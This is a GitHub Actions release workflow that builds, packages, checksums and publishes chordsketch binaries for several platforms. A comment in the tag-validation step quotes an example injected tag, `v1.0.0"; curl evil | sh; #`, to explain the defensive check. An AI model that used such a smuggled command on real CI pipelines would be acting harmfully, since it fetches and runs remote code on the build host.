name: Release

on:
  push:
    tags:
      - "v*"
  workflow_dispatch:
    inputs:
      tag:
        description: "Tag to build (e.g., v0.1.0)"
        required: true
        type: string

permissions:
  contents: read

env:
  CARGO_TERM_COLOR: always

jobs:
  build:
    name: Build ${{ matrix.target }}
    runs-on: ${{ matrix.os }}
    # Intentionally fail-closed: if any build matrix cell fails, the
    # downstream `release` job (needs: build) is skipped and no GitHub
    # Release is created. This is correct because release.yml creates
    # the authoritative artifact set that every downstream channel
    # (Docker, VS Code, napi, post-release rollup) keys off. A partial
    # release with one missing archive would silently degrade every
    # install path for that platform; holding the release until all
    # cells pass is the safer failure mode. Contrast with
    # `vscode-extension.yml build-platform`, which ships a universal
    # VSIX so users on a failing platform still get a working extension
    # (see #1795). See #1806.
    strategy:
      fail-fast: false
      matrix:
        include:
          - target: x86_64-unknown-linux-gnu
            os: ubuntu-latest
          - target: aarch64-unknown-linux-gnu
            os: ubuntu-latest
            cross: true
          - target: x86_64-unknown-linux-musl
            os: ubuntu-latest
            cross: true
          - target: aarch64-unknown-linux-musl
            os: ubuntu-latest
            cross: true
          - target: x86_64-apple-darwin
            os: macos-latest
          - target: aarch64-apple-darwin
            os: macos-latest
          - target: x86_64-pc-windows-msvc
            os: windows-latest
    steps:
      - uses: actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5 # v4

      - name: Install Rust toolchain
        run: |
          rustup toolchain install stable --profile minimal
          rustup target add ${{ matrix.target }}

      - name: Install cross
        if: matrix.cross
        run: cargo install cross --locked

      - name: Build
        run: |
          if [ "${{ matrix.cross }}" = "true" ]; then
            cross build --release --target ${{ matrix.target }} -p chordsketch -p chordsketch-lsp
          else
            cargo build --release --target ${{ matrix.target }} -p chordsketch -p chordsketch-lsp
          fi
        shell: bash

      - name: Validate release tag
        # Route inputs.tag through env + format regex before any
        # downstream step interpolates the version into a shell body.
        # Without this, a `workflow_dispatch` tag like
        # `v1.0.0"; curl evil | sh; #` would break out of the
        # `echo "version=..."` shell quoting in "Determine version".
        # See #1797.
        uses: ./.github/actions/validate-release-tag
        with:
          tag: ${{ inputs.tag || github.ref_name }}

      - name: Determine version
        id: version
        env:
          EVENT_NAME: ${{ github.event_name }}
          INPUT_TAG: ${{ inputs.tag }}
          REF_NAME: ${{ github.ref_name }}
        run: |
          set -euo pipefail
          if [ "$EVENT_NAME" = "workflow_dispatch" ]; then
            VERSION="$INPUT_TAG"
          else
            VERSION="$REF_NAME"
          fi
          echo "version=$VERSION" >> "$GITHUB_OUTPUT"
        shell: bash

      - name: Package (Unix)
        if: runner.os != 'Windows'
        run: |
          ARCHIVE_NAME="chordsketch-${{ steps.version.outputs.version }}-${{ matrix.target }}.tar.gz"
          STAGING="chordsketch-${{ steps.version.outputs.version }}-${{ matrix.target }}"
          mkdir "$STAGING"
          cp "target/${{ matrix.target }}/release/chordsketch" "$STAGING/"
          cp "target/${{ matrix.target }}/release/chordsketch-lsp" "$STAGING/"
          cp LICENSE README.md "$STAGING/"
          tar czf "$ARCHIVE_NAME" "$STAGING"
          echo "ARCHIVE=$ARCHIVE_NAME" >> "$GITHUB_ENV"
        shell: bash

      - name: Package (Windows)
        if: runner.os == 'Windows'
        run: |
          $Version = "${{ steps.version.outputs.version }}"
          $Target = "${{ matrix.target }}"
          $ArchiveName = "chordsketch-$Version-$Target.zip"
          $Staging = "chordsketch-$Version-$Target"
          New-Item -ItemType Directory -Path $Staging
          Copy-Item "target/$Target/release/chordsketch.exe" "$Staging/"
          Copy-Item "target/$Target/release/chordsketch-lsp.exe" "$Staging/"
          Copy-Item LICENSE, README.md "$Staging/"
          Compress-Archive -Path "$Staging/*" -DestinationPath $ArchiveName
          echo "ARCHIVE=$ArchiveName" >> $env:GITHUB_ENV
        shell: pwsh

      - name: Upload artifact
        uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02 # v4
        with:
          name: ${{ matrix.target }}
          path: ${{ env.ARCHIVE }}
          retention-days: 7

  release:
    name: Create Release
    needs: build
    runs-on: ubuntu-latest
    permissions:
      contents: write
    if: startsWith(github.ref, 'refs/tags/v') || github.event_name == 'workflow_dispatch'
    steps:
      - uses: actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5 # v4

      - name: Download all artifacts
        uses: actions/download-artifact@d3f86a106a0bac45b974a628896c90dbdf5c8093 # v4
        with:
          path: artifacts

      - name: Validate release tag
        # See rationale at the corresponding step in the `build` job.
        uses: ./.github/actions/validate-release-tag
        with:
          tag: ${{ inputs.tag || github.ref_name }}

      - name: Determine version
        id: version
        env:
          EVENT_NAME: ${{ github.event_name }}
          INPUT_TAG: ${{ inputs.tag }}
          REF_NAME: ${{ github.ref_name }}
        run: |
          set -euo pipefail
          if [ "$EVENT_NAME" = "workflow_dispatch" ]; then
            VERSION="$INPUT_TAG"
          else
            VERSION="$REF_NAME"
          fi
          echo "version=$VERSION" >> "$GITHUB_OUTPUT"

      - name: Generate checksums
        run: |
          cd artifacts
          find . -type f \( -name "*.tar.gz" -o -name "*.zip" \) -exec sha256sum {} \; | sed 's|  \./[^/]*/|  |' > ../checksums.txt
          cat ../checksums.txt

      - name: Create Release
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        run: |
          VERSION="${{ steps.version.outputs.version }}"
          gh release create "$VERSION" \
            --title "$VERSION" \
            --notes "See [CHANGELOG.md](https://github.com/koedame/chordsketch/blob/main/CHANGELOG.md) for details." \
            artifacts/*/* \
            checksums.txt \
            --draft=false
